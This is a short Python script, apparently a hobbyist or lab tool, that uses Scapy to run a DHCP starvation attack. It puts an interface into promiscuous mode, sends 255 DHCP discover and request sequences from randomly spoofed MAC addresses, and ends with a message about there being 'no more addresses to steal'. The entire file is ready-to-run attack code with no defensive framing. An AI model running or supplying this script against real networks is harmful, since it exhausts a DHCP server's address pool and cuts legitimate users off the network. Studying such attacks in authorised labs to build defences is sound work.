#! /usr/bin/env python

import logging
import subprocess
import random

logging.getLogger("scapy.loading").setLevel(logging.ERROR)
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
logging.getLogger("scapy.interactive").setLevel(logging.ERROR)


try:
    from scapy.all import *

except ImportError:
    print "http://pipy.python.org/pipy/scapy"
    sys.exit()

subprocess.call(["ifconfig", "enp0s3", "promisc"], stderr = None, stdout = None, shell = False)

conf.checkIPaddr = False

pkt_no = 255

def generate_dhcp_seq():
    x_id = random.randrange(1, 100000)
    hw = "00:30:ee" + str(RandMAC())[8:]
    hw_str = mac2str(hw)

    dhcp_dis_pkt = Ether(dst = 'ff:ff:ff:ff:ff:ff', src = hw) / IP(src = '0.0.0.0', dst = '255.255.255.255') / UDP(sport = 68, dport = 67) / BOOTP(op =1, xid = x_id, chaddr = hw_str) / DHCP(options = [("message-type", "discover"), ("end")])
    

    ans, unans = srp(dhcp_dis_pkt, iface = 'enp0s3', verbose = 0, timeout = 2.5)
    
    offered_ip = ans[0][1][BOOTP].yiaddr

    dhcp_req_pkt = Ether(dst = 'ff:ff:ff:ff:ff:ff', src = hw) / IP(src = '0.0.0.0', dst = '255.255.255.255') / UDP(sport = 68, dport = 67) / BOOTP(op = 1, xid = x_id, chaddr = hw_str) / DHCP(options = [("message-type", "request"), ("requested_addr", offered_ip), ("end")])

    srp(dhcp_req_pkt, timeout = 2.5, iface = 'enp0s3', verbose = 0) 

try:
    for iterate in range(0, int(pkt_no)):
         generate_dhcp_seq()

except IndexError:
    print "\n Done there are no more addresses to steal :) \n"
